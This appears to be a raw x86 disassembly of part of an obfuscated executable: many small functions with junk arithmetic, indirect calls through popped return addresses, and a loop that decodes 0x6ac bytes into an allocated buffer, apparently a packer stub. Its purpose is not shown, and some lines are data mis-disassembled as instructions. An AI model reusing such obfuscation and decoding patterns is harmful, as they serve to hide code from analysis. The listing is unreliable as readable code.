  4d10b8:	push   0x0
  4d10ba:	call   0x4d11b0
  4d10bf:	add    esp,0x4
  4d10c2:	pop    edi
  4d10c3:	add    esp,0x58
  4d10c6:	pop    ebp
  4d10c7:	ret    
  4d10c8:	pop    edi
  4d10c9:	call   DWORD PTR ds:0x4d2024
  4d10cf:	call   edi
  4d10d1:	add    BYTE PTR [eax],al
  4d10d3:	add    BYTE PTR [edi-0x1],bl
  4d10d6:	adc    eax,0x4d203c
  4d10db:	call   edi
  4d10dd:	add    BYTE PTR [eax],al
  4d10df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10e5:	sub    esp,0x50
  4d10e8:	or     esi,edi
  4d10ea:	mov    esi,0x4d3198
  4d10ef:	push   0x6ac
  4d10f4:	push   0x6ac
  4d10f9:	push   0x40001
  4d10fe:	mov    ecx,0x862985ae
  4d1103:	push   DWORD PTR [ecx+0x7a239a86]
  4d1109:	sub    DWORD PTR [esp],0x2
  4d110d:	mov    ecx,0x4d2044
  4d1112:	pop    DWORD PTR [ecx]
  4d1114:	call   0x4d12dc
  4d1119:	add    esp,0x4
  4d111c:	push   eax
  4d111d:	pop    DWORD PTR [esi-0x11c]
  4d1123:	mov    edx,DWORD PTR [esi-0x11c]
  4d1129:	mov    edi,edx
  4d112b:	sub    edx,edx
  4d112d:	dec    edx
  4d112e:	and    edx,0x4d0014
  4d1134:	mov    eax,0xd5d9a824
  4d1139:	xor    ecx,ecx
  4d113b:	cmp    ecx,0x6ac
  4d1141:	je     0x4d115f
  4d1143:	sub    ecx,0xfffffffc
  4d1146:	xor    ebx,ebx
  4d1148:	push   DWORD PTR [edx+ebx*1]
  4d114b:	add    DWORD PTR [esp],eax
  4d114e:	pop    DWORD PTR [edi+ebx*2]
  4d1151:	dec    DWORD PTR [edi]
  4d1153:	xor    eax,eax
  4d1155:	add    eax,DWORD PTR [edx]
  4d1157:	add    edx,0x4
  4d115a:	add    edi,0x4
  4d115d:	jmp    0x4d113b
  4d115f:	push   0x0
  4d1161:	call   0x4d0898
  4d1166:	add    esp,0x4
  4d1169:	add    esp,0x50
  4d116c:	pop    ebp
  4d116d:	ret    
  4d116e:	add    BYTE PTR [eax],al
  4d1170:	mov    edi,edi
  4d1172:	push   ebp
  4d1173:	mov    ebp,esp
  4d1175:	sub    esp,0x3c
  4d1178:	mov    esi,0x4d30c4
  4d117d:	or     DWORD PTR [esi-0x6c],ebx
  4d1180:	push   0x0
  4d1182:	call   0x4d0a90
  4d1187:	add    esp,0x4
  4d118a:	push   esi
  4d118b:	push   DWORD PTR [esi+0x1ac]
  4d1191:	push   edi
  4d1192:	call   0x4d1260
  4d1197:	add    esp,0x8
  4d119a:	pop    esi
  4d119b:	mov    eax,0x0
  4d11a0:	push   eax
  4d11a1:	call   0x4d10c8
  4d11a6:	add    esp,0x4
  4d11a9:	add    esp,0x3c
  4d11ac:	pop    ebp
  4d11ad:	ret    
  4d11ae:	add    BYTE PTR [eax],al
  4d11b0:	pop    edi
  4d11b1:	call   DWORD PTR ds:0x4d206c
  4d11b7:	call   edi
  4d11b9:	add    BYTE PTR [eax],al
  4d11bb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11c1:	sub    esp,0x40
  4d11c4:	mov    edi,0x4d3094
  4d11c9:	add    DWORD PTR [ebp-0x34],0xffffff8e
  4d11cd:	push   edi
  4d11ce:	push   0x0
  4d11d0:	call   0x4d0898
  4d11d5:	add    esp,0x4
  4d11d8:	pop    edi
  4d11d9:	push   edi
  4d11da:	push   esi
  4d11db:	push   esi
  4d11dc:	call   0x4d07d8
  4d11e1:	add    esp,0x8
  4d11e4:	pop    edi
  4d11e5:	push   edi
  4d11e6:	lea    esi,[edi-0x94]
  4d11ec:	push   esi
  4d11ed:	call   0x4d151c
  4d11f2:	add    esp,0x4
  4d11f5:	test   eax,eax
  4d11f7:	jne    0x4d11e6
  4d11f9:	pop    edi
  4d11fa:	add    esp,0x40
  4d11fd:	pop    ebp
  4d11fe:	ret    
  4d11ff:	add    BYTE PTR [edi-0x1],bl
  4d1202:	adc    eax,0x4d2058
  4d1207:	call   edi
  4d1209:	add    BYTE PTR [eax],al
  4d120b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1211:	sub    esp,0x58
  4d1214:	mov    edx,0x4d315c
  4d1219:	sbb    DWORD PTR [edx-0x58],edi
  4d121c:	push   edx
  4d121d:	push   DWORD PTR [edx+0x12c]
  4d1223:	push   DWORD PTR [edx+0x1e8]
  4d1229:	push   edi
  4d122a:	push   DWORD PTR [edx+0x80]
  4d1230:	call   0x4d11bc
  4d1235:	add    esp,0x10
  4d1238:	pop    edx
  4d1239:	push   edx
  4d123a:	call   0x4d0820
  4d123f:	add    esp,0x4
  4d1242:	pop    edx
  4d1243:	push   edx
  4d1244:	push   0x0
  4d1246:	call   0x4d1254
  4d124b:	add    esp,0x4
  4d124e:	pop    edx
  4d124f:	add    esp,0x58
  4d1252:	pop    ebp
  4d1253:	ret    
  4d1254:	pop    edi
  4d1255:	call   DWORD PTR ds:0x4d204c
  4d125b:	call   edi
  4d125d:	add    BYTE PTR [eax],al
  4d125f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1265:	sub    esp,0x30
  4d1268:	lea    ebx,ds:0x4d31c0
  4d126e:	or     DWORD PTR [ebp-0x8],ebx
  4d1271:	lea    edx,[ebx-0x1c0]
  4d1277:	push   edx
  4d1278:	call   0x4d151c
  4d127d:	add    esp,0x4
  4d1280:	test   eax,eax
  4d1282:	jne    0x4d1272
  4d1284:	push   ebx
  4d1285:	push   ecx
  4d1286:	push   ecx
  4d1287:	push   DWORD PTR [ebx+0x70]
  4d128a:	call   0x4d0c98
  4d128f:	add    esp,0xc
  4d1292:	pop    ebx
  4d1293:	call   0x4d0820
  4d1298:	add    esp,0x4
  4d129b:	add    esp,0x30
  4d129e:	pop    ebp
  4d129f:	ret    
  4d12a0:	mov    edi,edi
  4d12a2:	push   ebp
  4d12a3:	mov    ebp,esp
  4d12a5:	sub    esp,0x4c
  4d12a8:	lea    eax,[edx-0x84]
  4d12ae:	mov    DWORD PTR [eax-0x58],ebx
  4d12b1:	push   eax
  4d12b2:	push   0x0
  4d12b4:	call   0x4d0a1c
  4d12b9:	add    esp,0x4
  4d12bc:	pop    eax
  4d12bd:	push   eax
  4d12be:	push   DWORD PTR [eax+0x64]
  4d12c1:	push   ecx
  4d12c2:	push   esi
  4d12c3:	call   0x4d0910
  4d12c8:	add    esp,0xc
  4d12cb:	pop    eax
  4d12cc:	push   eax
  4d12cd:	call   0x4d0820
  4d12d2:	add    esp,0x4
  4d12d5:	pop    eax
  4d12d6:	add    esp,0x4c
  4d12d9:	pop    ebp
  4d12da:	ret    
  4d12db:	add    BYTE PTR [edi-0x1],bl
  4d12de:	adc    eax,0x4d2044
  4d12e3:	call   edi
  4d12e5:	add    BYTE PTR [eax],al
  4d12e7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12ed:	sub    esp,0x34
  4d12f0:	lea    eax,[ecx+0x68]
  4d12f3:	sub    DWORD PTR [ebp-0x20],0x12
  4d12f7:	push   eax
  4d12f8:	push   edi
  4d12f9:	push   esi
  4d12fa:	call   0x4d06ec
  4d12ff:	add    esp,0x8
  4d1302:	pop    eax
  4d1303:	push   eax
  4d1304:	push   0x0
  4d1306:	call   0x4d106c
  4d130b:	add    esp,0x4
  4d130e:	pop    eax
  4d130f:	push   eax
  4d1310:	call   0x4d0820
  4d1315:	add    esp,0x4
  4d1318:	pop    eax
  4d1319:	add    esp,0x34
  4d131c:	pop    ebp
  4d131d:	ret    
  4d131e:	add    BYTE PTR [eax],al
  4d1320:	mov    edi,edi
  4d1322:	push   ebp
  4d1323:	mov    ebp,esp
  4d1325:	sub    esp,0x24
  4d1328:	lea    edi,[ebx-0xbc]
  4d132e:	and    eax,DWORD PTR [edi+0x10]
  4d1331:	push   edi
  4d1332:	push   0x0
  4d1334:	call   0x4d10c8
  4d1339:	add    esp,0x4
  4d133c:	pop    edi
  4d133d:	push   edi
  4d133e:	push   edx
  4d133f:	push   DWORD PTR [edi+0x90]
  4d1345:	push   DWORD PTR [edi]
  4d1347:	call   0x4d0d44
  4d134c:	add    esp,0xc
  4d134f:	pop    edi
  4d1350:	push   edi
  4d1351:	mov    ebx,0x0
  4d1356:	push   ebx
  4d1357:	call   0x4d106c
  4d135c:	add    esp,0x4
  4d135f:	pop    edi
  4d1360:	add    esp,0x24
  4d1363:	pop    ebp
  4d1364:	ret    
  4d1365:	add    BYTE PTR [eax],al
  4d1367:	add    BYTE PTR [edi-0x1],bl
  4d136a:	adc    eax,0x4d2080
  4d136f:	call   edi
  4d1371:	add    BYTE PTR [eax],al
  4d1373:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1379:	sub    esp,0x2c
  4d137c:	lea    edx,[eax+0x100]
  4d1382:	mov    esi,edx
  4d1384:	push   edx
  4d1385:	push   ebx
  4d1386:	push   esi
  4d1387:	push   DWORD PTR [edx+0xcc]
  4d138d:	call   0x4d0c44
  4d1392:	add    esp,0xc
  4d1395:	pop    edx
  4d1396:	push   edx
  4d1397:	mov    ecx,0x0
  4d139c:	push   ecx
  4d139d:	call   0x4d0a90
  4d13a2:	add    esp,0x4
  4d13a5:	pop    edx
  4d13a6:	push   edx
  4d13a7:	mov    ebx,0x0
  4d13ac:	push   ebx
  4d13ad:	call   0x4d11b0
  4d13b2:	add    esp,0x4
  4d13b5:	pop    edx
  4d13b6:	add    esp,0x2c
  4d13b9:	pop    ebp
  4d13ba:	ret    
  4d13bb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13c1:	sub    esp,0x44
  4d13c4:	lea    ecx,[esi+0x114]
  4d13ca:	and    edx,edi
  4d13cc:	push   ecx
  4d13cd:	push   DWORD PTR [ecx+0x12c]
  4d13d3:	push   DWORD PTR [ecx+0x14]
  4d13d6:	push   DWORD PTR [ecx+0x9c]
  4d13dc:	push   eax
  4d13dd:	call   0x4d0d8c
  4d13e2:	add    esp,0x10
  4d13e5:	pop    ecx
  4d13e6:	push   ecx
  4d13e7:	push   0x0
  4d13e9:	call   0x4d09f8
  4d13ee:	add    esp,0x4
  4d13f1:	pop    ecx
  4d13f2:	push   ecx
  4d13f3:	call   0x4d1078
  4d13f8:	add    esp,0x4
  4d13fb:	pop    ecx
  4d13fc:	add    esp,0x44
  4d13ff:	pop    ebp
  4d1400:	ret    
  4d1401:	add    BYTE PTR [eax],al
  4d1403:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1409:	sub    esp,0x38
  4d140c:	mov    ecx,0x4d31f8
  4d1411:	add    DWORD PTR [ecx-0x60],ebx
  4d1414:	push   ecx
  4d1415:	call   0x4d0820
  4d141a:	add    esp,0x4
  4d141d:	pop    ecx
  4d141e:	push   ecx
  4d141f:	push   edx
  4d1420:	push   ebx
  4d1421:	push   eax
  4d1422:	call   0x4d1170
  4d1427:	add    esp,0xc
  4d142a:	pop    ecx
  4d142b:	push   ecx
  4d142c:	mov    edx,0x0
  4d1431:	push   edx
  4d1432:	call   0x4d0a1c
  4d1437:	add    esp,0x4
  4d143a:	pop    ecx
  4d143b:	add    esp,0x38
  4d143e:	pop    ebp
  4d143f:	ret    
  4d1440:	mov    edi,edi
  4d1442:	push   ebp
  4d1443:	mov    ebp,esp
  4d1445:	sub    esp,0x30
  4d1448:	lea    ebx,ds:0x4d30d8
  4d144e:	sub    ecx,0xfffffa8c
  4d1454:	mov    eax,0x0
  4d1459:	push   eax
  4d145a:	call   0x4d10c8
  4d145f:	add    esp,0x4
  4d1462:	push   ebx
  4d1463:	push   ecx
  4d1464:	push   DWORD PTR [ebx+0x1bc]
  4d146a:	push   DWORD PTR [ebx+0x19c]
  4d1470:	push   DWORD PTR [ebx+0x1b4]
  4d1476:	call   0x4d0b68
  4d147b:	add    esp,0x10
  4d147e:	pop    ebx
  4d147f:	push   0xfffffff4
  4d1481:	call   0x4d0c38
  4d1486:	add    esp,0x4
  4d1489:	add    esp,0x30
  4d148c:	pop    ebp
  4d148d:	ret    
  4d148e:	add    BYTE PTR [eax],al
  4d1490:	pop    edi
  4d1491:	call   DWORD PTR ds:0x4d2004
  4d1497:	call   edi
  4d1499:	add    BYTE PTR [eax],al
  4d149b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14a1:	sub    esp,0x30
  4d14a4:	lea    eax,[edx+0xb8]
  4d14aa:	sub    esi,0xffffffb2
  4d14ad:	push   eax
  4d14ae:	push   ecx
  4d14af:	push   ecx
  4d14b0:	call   0x4d0ed8
  4d14b5:	add    esp,0x8
  4d14b8:	pop    eax
  4d14b9:	push   eax
  4d14ba:	call   0x4d1078
  4d14bf:	add    esp,0x4
  4d14c2:	pop    eax
  4d14c3:	push   eax
  4d14c4:	push   0x0
  4d14c6:	call   0x4d1254
  4d14cb:	add    esp,0x4
  4d14ce:	pop    eax
  4d14cf:	add    esp,0x30
  4d14d2:	pop    ebp
  4d14d3:	ret    
  4d14d4:	mov    edi,edi
  4d14d6:	push   ebp
  4d14d7:	mov    ebp,esp
  4d14d9:	sub    esp,0x5c
  4d14dc:	mov    edx,0x4d30ec
  4d14e1:	cmp    edx,0x4568
  4d14e7:	je     0x4d14d7
  4d14e9:	push   edx
  4d14ea:	push   esi
  4d14eb:	push   DWORD PTR [edx+0x1c8]
  4d14f1:	push   ebx
  4d14f2:	push   DWORD PTR [edx+0xd8]
  4d14f8:	call   0x4d0960
  4d14fd:	add    esp,0x10
  4d1500:	pop    edx
  4d1501:	push   edx
  4d1502:	call   0x4d0820
  4d1507:	add    esp,0x4
  4d150a:	pop    edx
  4d150b:	push   edx
  4d150c:	push   0x0
  4d150e:	call   0x4d1010
  4d1513:	add    esp,0x4
  4d1516:	pop    edx
  4d1517:	add    esp,0x5c
  4d151a:	pop    ebp
  4d151b:	ret    
  4d151c:	pop    edi
  4d151d:	call   DWORD PTR ds:0x4d2018
  4d1523:	call   edi
  4d1525:	add    BYTE PTR [eax],al
  4d1527:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d152d:	sub    esp,0x20
  4d1530:	lea    edi,ds:0x4d315c
  4d1536:	sbb    DWORD PTR [edi+0xc],0x64
  4d153a:	push   edi
  4d153b:	push   eax
  4d153c:	push   ecx
  4d153d:	push   eax
  4d153e:	call   0x4d0bac
  4d1543:	add    esp,0xc
  4d1546:	pop    edi
  4d1547:	push   edi
  4d1548:	mov    ebx,0x0
  4d154d:	push   ebx
  4d154e:	call   0x4d1010
  4d1553:	add    esp,0x4
  4d1556:	pop    edi
  4d1557:	push   edi
  4d1558:	push   0x0
  4d155a:	call   0x4d0f38
  4d155f:	add    esp,0x4
  4d1562:	pop    edi
  4d1563:	add    esp,0x20
  4d1566:	pop    ebp
  4d1567:	ret    
  4d1568:	mov    edi,edi
  4d156a:	push   ebp
  4d156b:	mov    ebp,esp
  4d156d:	sub    esp,0x40
  4d1570:	lea    eax,[ebx-0x168]
  4d1576:	and    DWORD PTR [eax-0x44],0xfffff425
  4d157d:	push   eax
  4d157e:	push   DWORD PTR [eax+0x16c]
  4d1584:	push   DWORD PTR [eax+0x4c]
  4d1587:	push   ebx
  4d1588:	call   0x4d1374
  4d158d:	add    esp,0xc
  4d1590:	pop    eax
  4d1591:	push   eax
  4d1592:	call   0x4d0820
  4d1597:	add    esp,0x4
  4d159a:	pop    eax
  4d159b:	push   eax
  4d159c:	push   0x0
  4d159e:	call   0x4d106c
  4d15a3:	add    esp,0x4
  4d15a6:	pop    eax
  4d15a7:	add    esp,0x40
  4d15aa:	pop    ebp
  4d15ab:	ret    
